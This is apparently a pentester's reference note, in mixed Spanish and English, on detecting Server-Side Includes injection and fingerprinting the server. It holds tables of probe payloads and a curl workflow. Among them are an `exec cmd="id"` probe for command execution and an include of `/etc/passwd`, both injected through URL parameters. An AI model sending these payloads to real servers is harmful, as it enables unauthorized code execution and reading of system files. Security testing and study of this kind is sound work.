---
aliases:
  - SSI Detection
  - SSI Recon
  - SSI Probe
tags:
  - type/technique
  - vuln/ssi
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[Server-Side Includes (SSI) Injection]]'
---
# SSI - Detección y Reconocimiento

***

## Identificar SSI Habilitado

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Extensión `.shtml` | URL path con `.shtml` / `.shtm` / `.stm` | Apache/IIS handler default. |
| Server header | `Server: Apache/2.x` con mod_include | Apache stack. |
| Server header | `Server: Microsoft-IIS/x.y` con SSI module | IIS. |
| `.htaccess` `Options +Includes` | If accessible | Direct config. |
| Apache `AddHandler server-parsed .shtml` | Config indicator | Standard. |
| Custom MIME `text/x-server-parsed-html` | Per-config | Edge. |
| Apache `mod_include` listed | `apachectl -M` shows include_module | Server-side enum. |
| IIS handler mappings | `.shtml` mapped a SSI module | IIS Manager. |
| Page rendered fecha automática | `DATE_LOCAL` rendered | SSI active. |
| Legacy CMS / static sites | Old apps con SSI | Common. |
| Educational tutorials | Many basic tutorials use SSI | OSINT clue. |
| File listing reveals .shtml | Directory indexing exposes | Recon. |
| `stat` con `s` extension | `.shtml` files in repo | Source disclosure. |
| Wayback Machine | Historical .shtml URLs | OSINT. |
^ssi-detect-enabled

___

## Probes Iniciales

| **Probe** | **Payload** | **Indicator** |
|:---:|:---:|:---:|
| Standard date probe | `<!--#echo var="DATE_LOCAL" -->` | Renders fecha → SSI activo. |
| Document name probe | `<!--#echo var="DOCUMENT_NAME" -->` | Filename rendered. |
| Server software | `<!--#echo var="SERVER_SOFTWARE" -->` | Apache/IIS version. |
| Document root | `<!--#echo var="DOCUMENT_ROOT" -->` | Filesystem path. |
| Request URI | `<!--#echo var="REQUEST_URI" -->` | URL path reflected. |
| Inject en form fields | Search, contact, comments | Common injection point. |
| Inject en URL params | `?q=<!--#echo...-->` | Reflected vector. |
| Inject en User-Agent | If logged en .shtml | Header reflection. |
| Inject en filename | Upload con SSI en filename | Edge. |
| Probe error message | Invalid SSI → `[an error occurred while processing this directive]` | Confirms parser active. |
| Subtle probe | `<!--#config sizefmt="bytes"-->` | Sets var, no visible output. |
| HTML comment vs SSI | Plain HTML comment `<!-- -->` ignored, SSI `<!--#` parsed | Differential. |
| Confirm exec capability | `<!--#exec cmd="id"-->` | If runs → RCE-grade. |
| Confirm include | `<!--#include virtual="/index.html"-->` | If renders → file read. |
| Combine con file upload | Upload `.shtml` con SSI | Multi-vector. |
^ssi-detect-probes

### Quick probe workflow

```bash
TARGET="https://target/page.shtml"

# Probe 1: Date
curl -s "$TARGET?q=<!--%23echo+var=%22DATE_LOCAL%22+-->" | grep -oE '[A-Z][a-z]+,\s+[0-9]+\s'
# If date renders → SSI active

# Probe 2: Server software
curl -s "$TARGET?q=<!--%23echo+var=%22SERVER_SOFTWARE%22+-->" | grep -oE 'Apache/[0-9.]+|Microsoft-IIS/[0-9.]+'

# Probe 3: Document root
curl -s "$TARGET?q=<!--%23echo+var=%22DOCUMENT_ROOT%22+-->"

# Probe 4: Confirm exec capability
curl -s "$TARGET?q=<!--%23exec+cmd=%22id%22+-->"
# If `uid=...` → RCE confirmed

# Probe 5: Confirm include
curl -s "$TARGET?q=<!--%23include+file=%22/etc/passwd%22+-->"
```

___

## Fingerprint del Server (Recon Profundo)

| **Variable** | **Probe** | **Info** |
|:---:|:---:|:---:|
| `SERVER_SOFTWARE` | Server full version | CVE lookup. |
| `SERVER_NAME` | Hostname | Network recon. |
| `SERVER_PORT` | Port 80/443 | Standard. |
| `SERVER_PROTOCOL` | HTTP/1.1 / HTTP/2 | Stack version. |
| `DOCUMENT_ROOT` | Webroot abs path | LFI chain. |
| `SCRIPT_FILENAME` | Path al `.shtml` actual | Filesystem layout. |
| `REMOTE_USER` | User auth HTTP | If basic auth. |
| `HTTP_USER_AGENT` | Cliente UA | Self-recon. |
| `HTTP_REFERER` | Source page | Recon. |
| `HTTP_COOKIE` | Cookies actuales | Self-recon. |
| `PATH_INFO` | Extra path | Edge config. |
| `QUERY_STRING` | Raw query string | Reflection. |
| All env vars | `<!--#printenv -->` | Full dump. |
| Identify webroot | DOCUMENT_ROOT → LFI base | Standard. |
| Identify CGI capability | If CGI configured | Combine vector. |
| Identify SSL state | `HTTPS=on` env var | Edge. |
^ssi-detect-fingerprint

### Workflow recon profundo

```html
<!-- Single payload — comprehensive recon -->
<table border=1>
<tr><td>Server</td><td><!--#echo var="SERVER_SOFTWARE" --></td></tr>
<tr><td>Doc Root</td><td><!--#echo var="DOCUMENT_ROOT" --></td></tr>
<tr><td>Script</td><td><!--#echo var="SCRIPT_FILENAME" --></td></tr>
<tr><td>HTTPS</td><td><!--#echo var="HTTPS" --></td></tr>
<tr><td>Date</td><td><!--#echo var="DATE_LOCAL" --></td></tr>
</table>

<!-- Or full dump -->
<!--#printenv -->
```

***
